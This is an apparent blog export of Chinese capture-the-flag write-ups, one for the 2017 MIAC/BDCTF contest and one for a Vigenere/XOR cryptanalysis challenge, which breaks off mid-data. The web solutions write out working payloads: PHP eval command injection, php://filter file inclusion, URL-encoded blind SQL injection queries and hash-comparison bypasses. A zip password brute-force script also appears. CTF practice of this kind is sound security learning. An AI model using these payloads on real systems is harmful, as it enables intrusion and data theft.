  </entry>
  <entry>
    <title><![CDATA[2017 MIAC移动安全赛]]></title>
    <url>%2F171015MiacWP%2F</url>
    <content type="text"><![CDATA[2017/10/14 http://miac.cug.edu.cn/ http://www.yogeit.com/ https://www.bdctf.online/ Crypto贝斯的一家 12&gt; UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY=&gt; 依次base64、base64、base32、base16解码。flag{fl4g_1_B4se_i3_V3ry_9ood} 颜文字 12&gt; ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);&gt; aaencode ，在线解混淆 或在 chrome 的console里直接运行即可。其他还有jjencode,ppencode,rrencode等。 1alert("flag&#123;aaencode_f14g_h4h4h4&#125;") 你猜我像啥 12&gt; Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=&gt; 12345678910111213from base64 import *s='Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4='b64decode(s.replace('\n摩斯密码的解密(https://morsecode.scphillips.com/translator.html)#=&gt;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115#ASCII码转字符 &#125;3_e_0_eutylxrnhl33&#123;nst='125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115'tt=''.join(map(lambda x:chr(int(x)),t.split('-')))#字符串反转 sn&#123;33lhnrxlytue_0_e_3&#125;rtt=tt[::-1]#栅栏密码的解密 synt&#123;u3e3_l0h_ner_x3l&#125;#凯撒密码解密 flag&#123;h3r3_y0u_are_k3y&#125; 2017/10/23WEBWEB签到 签到，格式bdctf{xxxxx}http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080 12345678910111213 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'bdctf&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['user']) and isset($_POST['pass'])) &#123; if ($_GET['user'] == $_POST['pass']) print 'pass can not be user.'; else if (sha1($_GET['user']) === sha1($_POST['pass'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 对数组进行哈希会返回null，所以传进去两个数组即可。Flag: bdctf{welcomeBDCTF2017} 命令注入 格式是flag{xxxx}http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080 123456&lt;?php include "flag.php";error_reporting(0);show_source(__FILE__);$a = @$_REQUEST['hello'];eval("var_dump($a);"); 直接执行系统命令，system(&#39;cat flag.php&#39;) 。得到flag为flag{93odcGA47rSRFDG} 这不仅仅是WEB 格式bdctf{xxxxx}http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080 存在文件读取： 1234567891011//index.php//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=index.php&lt;?php$file = $_GET["page"];if( isset( $file ) ) include( $file );else &#123; header( 'Location:?page=include.php' ); exit;&#125;?&gt; 1234567891011121314151617181920//include.php//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=include.php&lt;?phpecho'&lt;html&gt;&lt;body&gt;&lt;p align="center"&gt;&lt;font size="20"&gt;&lt;b&gt;File Include&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;&lt;br&gt;&lt;p align="center"&gt;&lt;img src="photo.jpg"&gt;&lt;/p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;font color="white"&gt;文件格式为文本格式&lt;/font&gt;&lt;/body&gt;&lt;/html&gt;'?&gt; 访问不了惹。 MISCMISC签到题 R1kzRE1RWldHRTNET04yQ0dZWkRHTVpXR0kzRElNWldHTVlUR01CVEdJWlRHTlJVR01ZVEdNUlRIRTNETU1aWkdZMlRHTVpUSEUzREVNWlVHWVlUR01SVEdZM0RFTVpaR000RE1NWlRHQTNETU1aVEdNM0RHTlJYSVE9PT09PT0= 先base64解码，再base32解码，然后十六进制转ASCII码，得到flag为flag{b3bd61023d129f9e39b4a26b98c0f366} 常规杂项在文件末尾发现提示Password:Bluedon[0-9]{8} ，写python脚本生成字典，binwalk -e 提取出压缩包，使用ziperello爆破得到密码为Bluedon47632601，解压后还是一个压缩包，但应该是伪加密，用notepad++打开即可看到flag为flag{Aha!_Y0u_9Ot_i7}。 队友使用了ARCHPR掩码爆破，方便很多。 12345678import itertoolss0 = 'Bluedon'p = '0123456789'f = open('normalpass.txt', 'w+')passwd = ''for i in itertools.product(p, p, p, p, p, p, p, p): passwd = s0 + ''.join(i) f.write(passwd) 就在眼前 就在眼前恩，如题。格式BDCTF{xxxxx} flag=E5=80=BC=E5=B0=B1=E5=9C=A8=E6=AD=A4=E6=96=87=E6=A1=A3=E4=B8=AD=EF=BC=8C=E5=B9=B6=E4=B8=94=E4=BD=BF=E7=94=A8=E4=BA=86=E6=96=87=E6=9C=AC=E9=9A=90=E8=97=8F=E6=8A=8A=E8=87=AA=E5=B7=B1=E9=9A=90=E8=97=8F=E8=B5=B7=E6=9D=A5=E4=BA=86=E3=80=82=0A=E6=98=BE=E7=A4=BA=E5=87=BA=E9=9A=90=E8=97=8F=E6=96=87=E6=9C=AC=E5=8D=B3=E5=8F=AF 使用了Quoted Printable encode，在线解码 可知隐藏了flag，让其显示即可。BDCTF{Y0u_4Re_5ucCe5SFul} 队友将文件另存为XML，打开也可见flag。 2017/10/30web签到题 更大的数，格式bdctf{xxx}http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080 修改表单长度限制。bdctf{s0m2thing_ju8t_1ik2_thi8} 简单的题 格式flag{xxxx}http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080 123456if(isset($_POST['password'])) &#123; if (strcmp($_POST['password'], $flag) == 0) die($flag); else echo "密码不正确！";&#125; post一个数组 password[]= 即可。flag{Y0u_4re_G3t_FLAG_452} WEB100-2 提示是?hint，格式是flag{xxxx}http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080 根据提示访问http://127.0.0.1/ctfoj/bdctf.php?hint 得到源码。带上Cookie: BDCTF=s:21:&quot;BDCTF:www.bluedon.com&quot;%3b 即可得到flag{pBXeeZdOkG1QTP1} 。cookie中的分号要url编码一下。 123456789101112131415&lt;?php error_reporting(0); $KEY='BDCTF:www.bluedon.com'; include_once("flag.php"); $cookie = $_COOKIE['BDCTF']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === "$KEY") &#123; echo "$flag"; &#125; else &#123; foo 蓝盾管理员 you are not bd-admin，格式bdctf{xxx}http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080 访问view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php&amp;user=php://input 同时post the user is bdadmin 得到bd-admin!&lt;br&gt;PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+ ，解码后得到bdctf{Lfi_AnD_More} 123456789101112//index.php&lt;!-- @$user = $_GET["user"]; @$file = $_GET["file"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is bdadmin"))&#123; echo "hello bd-admin!&lt;br&gt;"; include($file); //flag.php &#125;else&#123; echo "you are not bd-admin ! "; &#125; --&gt; 送大礼 格式bdctf{xxx}http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080 访问 http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt 有jsfuck，解开 后内容如下： 123456789101112extract($_GET); if(isset($bdctf)) &#123; $content=trim(file_get_contents($flag)); if($bdctf==$content) &#123; echo'bdctf&#123;**********&#125;'; &#125; else &#123; echo'这不是蓝盾的密码啊'; &#125; &#125; 访问 http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo&amp;flag=php://input 同时post foo 得到bdctf{UCCdlsZyVe} 。 火星撞地球 flag{1q2w3e4r}密码就是答案，格式flag{xxxx}http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080 获取当前数据库名member 1name=admin%27%20and%20(ASCII(MID((database()),6,1)))=114%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前数据库只有一个表 1name=admin%27%20and%20(ASCII(MID((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),1,1)))=49%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前表名为member 1name=admin%27%20and%20(ASCII(MID((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),7,1)))&gt;0%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 当前表有四条记录 1name=admin%27%20and%20(ASCII(MID((select%20count(*)%20from%20member),1,1)))=52%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 得到列名’id,member_user,member_password,member_name，。。。’ 1name=admin%27%20and%20(ASCII(MID((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema='member'),44,1)))&gt;44%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 查询密码字段 burp爆破得到’5416d7cd6ef195a0f7622a9c56b55e84’，即’1q2w3e4r’。 1name=admin%27%20and%20(ASCII(MID((select%20member_password%20from%20member%20where%20member_user='admin'),1,1)))=53%23&amp;password=%27%20or%201&amp;submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95 最后flag为flag{1q2w3e4r} 密室杀人案[x] 格式bdctf{xxxx}http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080 12bdctf--密室谋杀案这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。 bluedon用户[x] 格式，bdctf{xxxxx}http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080 123456789101112131415161718192021222324252627282930//index.phpyou are not bluedon ! &lt;!--$user = $_GET["user"];$file = $_GET["file"];$pass = $_GET["pass"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is bluedon"))&#123; echo "hello bluedon!&lt;br&gt;"; include($file); //class.php&#125;else&#123; echo "you are not bluedon ! ";&#125; --&gt; //class.php//view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php&amp;user=php://inputthe user is bluedon&lt;?phpclass Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return "恭喜get flag"; &#125;&#125;?&gt;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF平台 Vigenere writeup]]></title>
    <url>%2F171005NuptVigenereWP%2F</url>
    <content type="text"><![CDATA[题目 It is said that Vigenere cipher does not achieve the perfect secrecy actually :-) Tips: 1.The encode pragram is given; 2.Do u no index of coincidence ？ 3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction) encode.cpp code.txt 什么是异或异或（exclusive or）是二元逻辑运算符，符号为 XOR 或 EOR 或 ⊕或 ^ 。对于表达式 a^b 的取值，当且仅当a、b逻辑值不同时为真。具体来说就是四个式子：1^1=0; 0^0=0; 1^0=1; 0^1=1 。另外，异或有一些基本的特性，本题仅用到第七行的特性即可。 1234567891011121314a^a=0;a^0=a;a^b=b^a;a^(b^c)=(a^b)^c;a^b^b=a;------------------------------------------如果 cipher = plain ^ key，那么 plain = cipher ^ key简单地证明一下： c = p ^ k --&gt; c ^ k = p ^ k ^ k --&gt; c ^ k = p------------------------------------------一个以字节为单位进行异或的例子： 97^98 --&gt; 01100001 ^ 01100010 = 00000011 -&gt; 3 概念我们知道，英文中的每个字母使用频率是不同的，在够长的一段话里，各个字母的占比大致稳定，并且这个稳定值也已经用巨大的语料库统计出来了，这就是字母频率。这种统计层面的现象，就给我们提供了判断一段文字是否可能有意义的依据，并且这种判断可以通过编程轻松完成。然而，给定两个字母组合，只计算出其中各字母的占比是不够的，想要准确高效地比较两段文字谁更可能具备有意义的语义，我们最好算出一个归一化参数，用以直观表示可能性的大小，这就是文中提到的 correlation ，计算公式也是有的， ，其中n(i)指字母i在一段话的所有字母中所占的比例，f(i)就是已经统计出来的i字母的频率，具体如下所示。 字母频率列表： 123456frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; 解题理解加密题目的加密方式大致等价于这样写： 12345678910# coding:utf8key = [0xba, 0x1f, 0x91, 0xb2, 0x53, 0xcd, 0x3e] # 长度范围是1-13，当然，我们还不知道key是多少plain = open('ptext.txt').read()cipher = open('ctext.txt', 'w+')c = ''k = 0for p in plain: c += hex(ord(p) ^ key[k])[2:].zfill(2) k = (k + 1) % len(key)cipher.write(c) 程序意思是将明文和密钥逐字节异或，每次异或后的值用两位十六进制表示写入文件，也就是我们见到的code.txt，在这个过程中，密钥是循环使用的。 那么现在情况是这样的，我们知道： 密钥的长度区间为1-13字节 加密方式为逐字节循环异或 加密结果，即密文的完整内容 我们想知道 明文内容 密钥内容 (⊙﹏⊙) 这看起来有点困难。 不过，其实还有两个不言而喻但非常重要的信息 明文的每一个字节都是可见字符。 明文是一段有意义的话。 解密代码主程序先放个主程序，和下面的对照着看。全部代码在文章底部 。 123456789101112131415def main(): ps = [] ks = [] ss = [] ps.extend(xrange(32, 127)) ks.extend(xrange(0xff + 1)) ss.extend(xrange(1, 14)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) plain = vigenereDecrypt(cipher, key) print key, plain 确定密钥的长度和候选字符集明文由可见字符组成。这意味着任何一个使明文出现不可见字符的值都不可能出现在key里。依据此可以取得两个进展。 求出key的每一个字节有哪些候选字符。具体操作：当我们假设某一字节的key的值时，就可以使用前文提到的plain = cipher ^ key 求出这一字节密文对应的明文，如果这个明文是不可见的，那么我们假设的这个值就不可能出现在key的这个字节。因为是循环异或，所以每个字节的key会去加密多个字节的明文，我们就可以如法炮制，大大缩小key的每个字节的候选字符集。 在1的基础上，确定key可能有哪几种长度。具体操作：我们假设key每一种可能的长度，一一去求对应的候选字符集， 如果有一种长度的key在某一字节的候选字符集为空，那么key就不可能是这个长度。 至此，我们可以从无到有求得 key有哪些可能的长度 以及 key在每一种长度下对应的每个字节的候选字符集 。 上代码： 1234567891011121314151617181920212223242526272829303132def getKeyPool(cipher, stepSet, plainSet, keySet): ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值， 密钥字符集为数字列表。 形如&#123; 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] &#125; ''' keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPool 遍历候选字符集，求出对应的字频这虽是个体力活，却也得小心翼翼。 123456789101112131415161718192021222324def getFrequency(cipher, keyPoolList): ''' 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[&#123; 0x11:&#123;'a':2,'b':3&#125;, 0x12:&#123;'e':6&#125; &#125;, &#123; 0x22:&#123;'g':1&#125; &#125;] ''' freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqList 根据字频求得密钥明文是一段有意义的话。这意味着它算出来的correlation值一定是所有候选明文中最大的，依照这一点就能挑出密钥每个字节的值，从而得到整个密钥。这也是整个解密过程最核心的一部分。 12345678910111213141516171819202122232425262728293031323334def calCorrelation(cpool): '''传入字典，形如&#123;'e':2,'p':3&#125; 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) ''' frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; relative = 0.0 total = 0 fpool = 'etaoinshrdlcumwfgypbvkjxqz' total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relativedef analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r &gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return key 根据密钥解密求出密钥剩下的就好办了。 12345678def vigenereDecrypt(cipher, key): plain = '' cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plain 一些数据可能的密钥长度和对应字符集123456789101112131415&#123;7: [[162, 165, 168, 169, 170, 174, 175, 178, 179, 180, 184, 185, 186, 187, 189, 190, 191], [0, 2, 10, 11, 12, 17, 21, 23, 25, 26, 27, 28, 29, 30, 31, 65, 66, 67, 68, 69, 70, 71, 72, 73, 